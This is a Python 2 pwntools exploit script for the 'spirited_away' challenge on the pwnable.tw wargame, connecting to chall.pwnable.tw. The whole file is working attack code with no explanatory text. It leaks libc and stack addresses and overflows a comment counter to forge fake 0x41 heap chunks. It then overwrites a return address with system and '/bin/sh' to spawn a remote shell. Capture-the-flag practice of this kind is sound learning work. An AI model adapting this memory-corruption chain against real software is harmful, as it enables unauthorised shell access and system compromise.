#!/usr/bin/env python2
from pwn import *
import sys

#MyTemplate
elf = ELF("./spirited_away")
libc = ELF("./libc_32.so.6")
ld = ELF("./ld-2.23.so")

lokal = False
context.binary = elf
#context.arch = ''

s    = lambda data               :xp.send(data)
sa   = lambda delim,data         :xp.sendafter(delim,data)
sl   = lambda data               :xp.sendline(data)
sla  = lambda delim,data         :xp.sendlineafter(delim,data)
r    = lambda numb=4096          :xp.recv(numb)
ru   = lambda delims, drop=True  :xp.recvuntil(delims, drop)
uu64 = lambda x                  :u64(x.ljust(8,"\x00"))
uu32 = lambda x                  :u32(x.ljust(4,"\x00"))

if len(sys.argv) > 1:
	Debug = True
else:
	Debug = False

if lokal:
    xp = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path},aslr=False)
else:
    host = 'chall.pwnable.tw'
    port = '10204'
    xp = remote(host,port)

if Debug:
    context.terminal = ["tmux","splitw","-h"]
    cmd = ""
    gdb.attach(xp,cmd)


#Exploit Here
def comment(name,age,r,c):
	sa("name: ",name)
	sla("age: ",str(age))
	sa("movie? ",r)
	sa("ent: ",c)

comment("1",1,"A"*(24),"B")
ru("A"*24)
leak_libc = uu32(r(4))
print hex(leak_libc)
libc.address = leak_libc - (libc.symbols['_IO_file_sync']) - 7
print hex(libc.address)
system = libc.symbols['system']
binsh = libc.search('/bin/sh').next()

sl("y")
comment("1",1,"B"*(14*4),"C")
ru("B"*(14*4))
leak_stack = uu32(r(4)) -0x68
print hex(leak_stack)
sa("<y/n>: ",'y')

for i in range(98):
	print i
	comment("1",1,"1","1")
	sa("<y/n>: ",'y')
#
p = p32(0)
p += p32(0x41)
p += "\x00"*(56)
p += p32(0) #next_size
p += p32(0x41)
# p += p32(0x10000)

p2 = "A"*(0x54)
p2 += p32(leak_stack)

comment("1",1,p,p2)
sa("<y/n>: ",'y')

p ="A"*0x4c
p += p32(system)
p += "AAAA"
p += p32(binsh)

comment(p,1,"A","B")
sl("n")

xp.interactive()
